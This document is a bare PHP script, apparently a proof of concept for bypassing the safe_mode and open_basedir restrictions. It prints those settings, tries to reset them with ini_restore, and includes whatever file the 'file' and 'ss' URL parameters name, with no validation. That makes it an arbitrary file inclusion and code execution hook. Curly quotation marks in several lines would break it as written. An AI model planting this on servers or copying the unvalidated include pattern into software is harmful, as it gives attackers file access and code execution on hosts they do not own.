<?
echo ini_get(“safe_mode”);
echo ini_get(“open_basedir”);
include($_GET["file"]);
ini_restore(“safe_mode”);
ini_restore(“open_basedir”);
echo ini_get(“safe_mode”);
echo ini_get(“open_basedir”);
include($_GET["ss"]);
?>